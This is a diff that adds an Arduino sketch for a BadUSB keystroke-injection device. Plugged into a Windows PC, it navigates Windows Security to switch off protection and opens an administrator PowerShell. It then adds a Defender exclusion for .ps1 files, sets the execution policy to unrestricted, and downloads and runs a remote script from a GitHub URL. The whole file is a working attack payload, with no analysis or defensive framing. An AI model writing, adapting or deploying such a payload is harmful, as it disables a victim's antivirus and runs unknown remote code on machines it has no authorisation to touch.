@@ -1,0 +1,172 @@
+#include <Keyboard.h> 
+
+// Init function
+void setup()
+{
+  // Begining the stream
+  Keyboard.begin();
+
+  // Waiting 500ms for init
+  delay(500);
+
+  delay(2500);
+
+  // Minimize all app
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(100);
+  Keyboard.releaseAll();
+
+  delay(500);
+
+  // turn off runtime
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(115);
+  Keyboard.releaseAll();
+
+  delay(500);
+
+  Keyboard.print("windows security");
+
+  delay(200);
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);       
+
+  typeKey(KEY_TAB);
+
+  delay(1000);
+
+  typeKey(KEY_TAB);
+
+  delay(1000);
+
+  typeKey(KEY_TAB);
+
+  delay(1000);
+
+  typeKey(KEY_TAB);
+
+  delay(1000);
+
+  typeKey(KEY_RETURN);
+
+  delay(200);
+
+  typeKey(KEY_TAB);
+
+  delay(200);
+
+  typeKey(KEY_TAB);
+
+  delay(200);
+
+  typeKey(KEY_TAB);
+
+  delay(200);
+
+  typeKey(KEY_TAB);
+
+  delay(200);
+
+  typeKey(KEY_RETURN);
+
+  delay(200);
+
+  typeKey(' ');
+
+  delay(2000);
+
+  typeKey(KEY_LEFT_ARROW);
+
+  delay(500);
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  Keyboard.releaseAll();
+
+  delay(500);
+
+  // Start powershell as admin
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(114);
+  Keyboard.releaseAll();
+
+  delay(500);
+
+  Keyboard.print("powershell.exe");
+
+  delay(200);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  delay(2000);
+
+  typeKey(KEY_LEFT_ARROW);
+
+  delay(150);
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);
+
+  // Go to public documents directory
+  Keyboard.print("cd C:\\Users\\Public\\Documents");
+
+  typeKey(KEY_RETURN);
+
+  // Add an exception for .ps1 files in antivirus
+  Keyboard.print("Add-MpPreference -ExclusionExtension ps1 -Force");
+
+  typeKey(KEY_RETURN);
+
+  // Disable script blocker
+  Keyboard.print("Set-ExecutionPolicy unrestricted -Force");
+
+  typeKey(KEY_RETURN);
+
+  // Download ps1 script
+  Keyboard.print("wget https://raw.githubusercontent.com/idontknow-CC/gigido/main/ciaoV2_upload.ps1 -OutFile ciaoV2_upload.ps1");
+
+  typeKey(KEY_RETURN);
+
+  delay(3500);
+
+  // Start ps1 script
+  Keyboard.print("powershell.exe -noexit -file ciaoV2_upload.ps1");
+
+  typeKey(KEY_RETURN);
+
+  // Make capslock flash to know when you can unplug the BadUSB
+  typeKey(KEY_CAPS_LOCK);
+
+  delay(500);
+
+  typeKey(KEY_CAPS_LOCK);
+
+  delay(500);
+
+  typeKey(KEY_CAPS_LOCK);
+
+  delay(500);
+
+  typeKey(KEY_CAPS_LOCK);
+
+  // End of payload}
+}
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+// Unused
+void loop() {}
